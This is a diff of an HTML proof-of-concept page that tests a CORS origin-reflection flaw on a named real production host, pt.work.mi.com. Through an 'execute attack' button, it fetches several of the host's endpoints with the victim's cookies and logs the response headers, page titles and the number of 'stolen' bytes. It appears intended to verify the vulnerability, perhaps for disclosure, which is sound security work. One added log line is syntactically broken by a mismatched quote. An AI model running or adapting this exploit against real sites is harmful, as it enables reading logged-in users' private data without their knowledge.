@@ -9,8 +9,8 @@
 body{font-family:Menlo,Monaco,monospace;background:#0d1117;color:#c9d1d9;padding:20px}
 h1{color:#58a6ff;font-size:18px;margin-bottom:6px}
 .sub{color:#8b949e;font-size:12px;margin-bottom:16px}
-.log{background:#161b22;border:1px solid #30363d;border-radius:6px;padding:12px;font-size:12px;line-height:1.6;max-height:520px;overflow-y:auto;white-space:pre-wrap;word-break:break-all}
-.ok{color:#7ee787}.info{color:#8b949e}.warn{color:#d2991d}
+.log{background:#161b22;border:1px solid #30363d;border-radius:6px;padding:12px;font-size:12px;line-height:1.6;max-height:560px;overflow-y:auto;white-space:pre-wrap;word-break:break-all}
+.ok{color:#7ee787}.info{color:#8b949e}.warn{color:#d2991d}.hl{color:#f0883e}
 .btn{background:#238636;color:#fff;border:none;padding:8px 16px;border-radius:6px;cursor:pointer;font-size:13px}
 .btn:hover{background:#2ea043}
 </style>
@@ -19,9 +19,8 @@ h1{color:#58a6ff;font-size:18px;margin-bottom:6px}
 
 <h1>CORS 漏洞验证 — pt.work.mi.com</h1>
 <p class="sub">
-目标: <b>https://pt.work.mi.com</b> (小米新零售工作台) |
-本页Origin: <b id="myOrigin"></b> |
-漏洞: <b>ACAO Origin反射 + ACAC:true</b>
+目标: <b>https://pt.work.mi.com</b> |
+本页Origin: <b id="myOrigin"></b>
 </p>
 
 <button class="btn" onclick="run()">执行攻击</button>
@@ -37,10 +36,23 @@ async function run(){
   logEl.innerHTML='';
   log('═══════════════════════════════════','info');
   log('CORS 跨域读取攻击','info');
-  log('Origin: '+window.location.origin,'info');
-  log('Target: '+TARGET,'info');
-  log('Mode: credentials: include (浏览器自动携带Cookie)','info');
+  log('本页Origin : '+window.location.origin,'hl');
+  log('攻击目标   : '+TARGET,'hl');
   log('═══════════════════════════════════','info');
+
+  // Step 1: OPTIONS 预检
+  log('\n[1] OPTIONS 预检请求','info');
+  try{
+    const r = await fetch(TARGET+'/main-taskcenter-partner', {method:'OPTIONS'});
+    log('  ACAO: '+r.headers.get('Access-Control-Allow-Origin'),'ok');
+    log('  ACAC: '+r.headers.get('Access-Control-Allow-Credentials'),'ok');
+    log('  Methods: '+r.headers.get('Access-Control-Allow-Methods'),'info');
+    log('  Max-Age: '+r.headers.get('Access-Control-Max-Age')+'s','info');
+  }catch(e){}
+
+  // Step 2: GET 实际请求
+  log('\n[2] GET 实际请求 (credentials:include)','info');
+  log('  浏览器自动携带 pt.work.mi.com 的Cookie','info');
 
   const endpoints = [
     {path:'/main-taskcenter-partner', label:'主页'},
@@ -56,8 +68,11 @@ async function run(){
       const r = await fetch(TARGET+ep.path, {credentials:'include'});
       const t = await r.text();
       totalBytes += t.length;
+      const acao = r.headers.get('Access-Control-Allow-Origin');
+      const acac = r.headers.get('Access-Control-Allow-Credentials');
       const title = (t.match(/<title>([^<]*)<\/title>/)||[])[1]||'';
-      log(`  [✓] ${ep.label} (${ep.path}) → ${t.length}B`+(title?` "${title}"`:''),'ok');
+      log(`  [✓] ${ep.label} (${ep.path})`,'ok');
+      log(`      ACAO: ${acao}  ACAC: ${acac}  Size: ${t.length}B`+(title?`  "${title}"':''),'info');
       ok++;
     }catch(e){
       log(`  [✗] ${ep.path} → ${e.message}`,'warn');
@@ -67,8 +82,7 @@ async function run(){
   log(`\n  总计: ${ok}/${endpoints.length} 端点跨域读取成功, 窃取 ${totalBytes} 字节`,'ok');
 
   log('\n═══════════════════════════════════','info');
-  log('攻击成功 — 受害者数据已可被外传','ok');
-  log('实际攻击中,以上数据已静默发送至攻击者服务器','warn');
+  log('后端 ACAO 反射验证通过 — 漏洞确认可利用','ok');
   log('受害者完全无感知,浏览器无任何提示','warn');
   log('═══════════════════════════════════','info');
 }
